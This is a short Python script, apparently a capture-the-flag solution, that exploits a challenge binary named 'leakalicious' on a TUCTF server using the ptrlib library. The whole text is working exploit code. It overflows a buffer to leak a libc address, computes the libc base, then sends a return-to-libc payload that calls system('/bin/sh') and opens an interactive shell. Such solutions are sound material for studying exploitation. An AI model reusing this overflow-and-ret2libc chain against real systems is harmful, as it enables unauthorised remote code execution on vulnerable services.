from ptrlib import *

libc = ELF("libc6_2.23-0ubuntu11_i386.so")
#sock = Process("./leakalicious")
sock = Socket("chal.tuctf.com", 30505)

payload = b'A' * 0x2c
sock.sendafter("> ", payload)
libc_base = u32(sock.recvline()[-6:-2]) - libc.symbol('__libc_start_main') - 0xf7
logger.info("libc = " + hex(libc_base))

sock.sendafter("> ", "hello")

payload = b'A' * 0x2c
payload += p32(libc_base + libc.symbol('system'))
payload += p32(0xdeadbeef)
payload += p32(libc_base + next(libc.find('/bin/sh')))
sock.sendafter("> ", payload)

sock.interactive()
